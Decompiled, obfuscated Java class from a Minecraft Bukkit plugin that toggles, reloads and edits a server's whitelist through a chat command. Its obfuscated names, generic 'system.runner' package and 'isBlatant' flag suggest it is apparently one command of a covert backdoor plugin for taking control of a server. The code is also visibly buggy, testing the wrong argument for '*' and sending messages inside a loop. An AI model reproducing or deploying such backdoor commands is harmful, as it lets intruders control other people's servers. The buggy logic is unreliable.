/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class WhitelistCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllllIIlIIIlIlIlllIII, String llllllllllllllllIIlIIIlIlIllIlll, String[] llllllllllllllllIIlIIIlIlIllIlII, Player llllllllllllllllIIlIIIlIlIllIIll) {
        if (llllllllllllllllIIlIIIlIlIllIlII.length <= 1) {
            llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.USAGE("whitelist <on | off | reload | add | remove>"));
        } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equalsIgnoreCase("on")) {
            DataManager.getData().set("whitelist_allowed", (Object)true);
            DataManager.saveData();
            Bukkit.setWhitelist((boolean)true);
            llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("Whitelist has turned on!"));
        } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equalsIgnoreCase("off")) {
            DataManager.getData().set("whitelist_allowed", (Object)false);
            DataManager.saveData();
            Bukkit.setWhitelist((boolean)false);
            llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("Whitelist has been turned off!"));
        } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equalsIgnoreCase("reload")) {
            Bukkit.reloadWhitelist();
            llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("Whitelist has been reloaded!"));
        } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equalsIgnoreCase("add")) {
            if (llllllllllllllllIIlIIIlIlIllIlII.length <= 2) {
                llllllllllllllllIIlIIIlIlIllIIll.setWhitelisted(true);
                llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("You have been added to the whitelist!"));
            } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equals("*")) {
                for (Player llllllllllllllllIIlIIIlIlIllllIl : Bukkit.getOnlinePlayers()) {
                    llllllllllllllllIIlIIIlIlIllllIl.setWhitelisted(true);
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("All online players are now whitelisted"));
                }
            } else {
                Player llllllllllllllllIIlIIIlIlIllllII = Bukkit.getServer().getPlayer(llllllllllllllllIIlIIIlIlIllIlII[2]);
                if (llllllllllllllllIIlIIIlIlIllllII == null) {
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllIIlIIIlIlIllIlII[1]).append(Settings.WHITE).append(" is not online."))));
                } else {
                    llllllllllllllllIIlIIIlIlIllllII.setWhitelisted(true);
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllIIlIIIlIlIllllII.getName()).append(Settings.WHITE).append(" is now whitelisted!"))));
                }
            }
        } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equalsIgnoreCase("remove")) {
            if (llllllllllllllllIIlIIIlIlIllIlII.length <= 2) {
                llllllllllllllllIIlIIIlIlIllIIll.setWhitelisted(false);
                llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("You have been removed from the whitelist!"));
            } else if (llllllllllllllllIIlIIIlIlIllIlII[1].equals("*")) {
                for (Player llllllllllllllllIIlIIIlIlIlllIll : Bukkit.getOnlinePlayers()) {
                    llllllllllllllllIIlIIIlIlIlllIll.setWhitelisted(false);
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX("All online players have been removed from the whitelist"));
                }
            } else {
                Player llllllllllllllllIIlIIIlIlIlllIlI = Bukkit.getServer().getPlayer(llllllllllllllllIIlIIIlIlIllIlII[2]);
                if (llllllllllllllllIIlIIIlIlIlllIlI == null) {
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllIIlIIIlIlIllIlII[1]).append(Settings.WHITE).append(" is not online."))));
                } else {
                    llllllllllllllllIIlIIIlIlIlllIlI.setWhitelisted(false);
                    llllllllllllllllIIlIIIlIlIllIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllIIlIIIlIlIlllIlI.getName()).append(Settings.WHITE).append(" is no longer whitelisted!"))));
                }
            }
        }
    }

    public WhitelistCommand() {
        WhitelistCommand llllllllllllllllIIlIIIlIllIIIIll;
    }
}

